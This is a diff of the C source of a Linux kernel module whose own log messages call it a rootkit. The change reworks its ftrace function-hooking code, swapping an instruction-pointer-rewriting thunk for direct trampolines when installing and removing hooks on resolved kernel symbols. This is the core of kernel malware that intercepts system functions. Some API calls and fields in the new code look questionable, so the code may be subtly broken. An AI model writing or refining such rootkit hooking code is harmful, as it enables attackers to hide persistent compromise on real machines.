@@ -4,21 +4,7 @@
 #include <linux/uaccess.h>
 #include <linux/slab.h>
 #include <linux/module.h>
-#include <linux/version.h>
 #include <linux/ftrace.h>
-
-
-
-static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
-                                 struct ftrace_ops *ops, struct ftrace_regs *fregs)
-{
-    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
-
-    // Éviter la récursion, on ne modifie l'IP que si le parent n'est pas dans notre module
-    if (!within_module(parent_ip, THIS_MODULE)) {
-        ftrace_regs_set_ip(fregs, (unsigned long)hook->function);
-    }
-}
 
 static int resolve_hook_addr(struct ftrace_hook *hook) {
     hook->address = ksym_lookup_name(hook->name);
@@ -38,27 +24,27 @@ int install_hook(struct ftrace_hook *hook) {
     if (err)
         return err;
 
-    hook->ops.func = ftrace_thunk;
-    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
+    // direct trampolines
+    hook->ops.flags = FTRACE_OPS_FL_DIRECT | FTRACE_OPS_FL_SAVE_REGS;
+    hook->ops.func = NULL; 
+    hook->ops.direct_func = NULL;
 
-    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+    err = register_ftrace_direct(&hook->ops, hook->address, (unsigned long)hook->function);
     if (err) {
-        pr_err("rootkit: ftrace_set_filter_ip failed: %d\n", err);
+        pr_err("rootkit: register_ftrace_direct failed for %s: %d\n", hook->name, err);
         return err;
     }
 
-    err = register_ftrace_function(&hook->ops);
-    if (err) {
-        pr_err("rootkit: register_ftrace_function failed: %d\n", err);
-        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
-    }
+    return 0;
+}
 
-    return err;
+void remove_hook(struct ftrace_hook *hook) {
+    unregister_ftrace_direct(&hook->ops, hook->address, (unsigned long)hook->function);
 }
 
 int install_hooks(struct ftrace_hook *hooks, size_t count) {
-    size_t i;
     int err;
+    size_t i;
 
     for (i = 0; i < count; i++) {
         err = install_hook(&hooks[i]);
@@ -71,17 +57,6 @@ int install_hooks(struct ftrace_hook *hooks, size_t count) {
     }
 
     return 0;
-}
-
-void remove_hook(struct ftrace_hook *hook) {
-    int err;
-    err = unregister_ftrace_function(&hook->ops);
-    if (err)
-        pr_debug("rootkit: unregister_ftrace_function failed: %d\n", err);
-
-    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
-    if (err)
-        pr_debug("rootkit: ftrace_set_filter_ip failed: %d\n", err);
 }
 
 void remove_hooks(struct ftrace_hook *hooks, size_t count) {
